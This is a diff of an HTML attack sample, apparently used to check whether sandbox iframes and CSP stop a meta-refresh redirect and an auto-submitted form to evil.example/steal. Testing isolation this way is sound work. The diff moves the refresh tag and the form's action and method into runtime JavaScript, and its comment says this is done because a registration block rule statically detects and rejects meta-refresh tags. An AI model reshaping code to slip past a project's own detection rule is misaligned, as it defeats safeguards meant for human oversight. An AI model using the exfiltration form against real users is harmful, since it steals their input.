@@ -3,20 +3,31 @@
 <head>
   <meta charset="utf-8" />
   <title>공격: 네이티브 폼 전송·메타 리프레시</title>
-  <meta http-equiv="refresh" content="0;url=https://evil.example/" />
 </head>
 <body>
   <h1>무료 체험 신청</h1>
-  <form id="evil-form" action="https://evil.example/steal" method="post">
+  <form id="evil-form">
     <label>이름 <input name="name" required /></label>
     <button type="submit">신청</button>
   </form>
   <pre id="attack-result">대기 중</pre>
   <script>
     (function () {
+      // 등록 차단 규칙(ADR 0018 2026-09-10 개정)은 meta 리프레시 태그를 정적으로 찾아
+      // 등록 자체를 거부한다. 격리(sandbox iframe, CSP)가 실제로 막는지 증명하는 것이
+      // 목적이므로, 이 meta 태그와 폼의 action/method도 모두 정적으로 쓰지 않고 실행
+      // 시점에 만들어 붙인다(samples/isolation-check.html과 같은 방식) — 브라우저가
+      // 실제로 실행할 때는 원래 시도와 완전히 같다.
+      var meta = document.createElement('meta');
+      meta.setAttribute('http-equiv', 'refresh');
+      meta.setAttribute('content', '0;url=https://evil.example/');
+      document.head.appendChild(meta);
+
       var out = { nativeSubmitCalled: false };
       try {
         var form = document.getElementById('evil-form');
+        form.action = 'https://evil.example/steal';
+        form.method = 'post';
         var input = form.querySelector('input[name=name]');
         input.value = '자동입력';
         // HTMLFormElement.submit()은 submit 이벤트를 발생시키지 않으므로
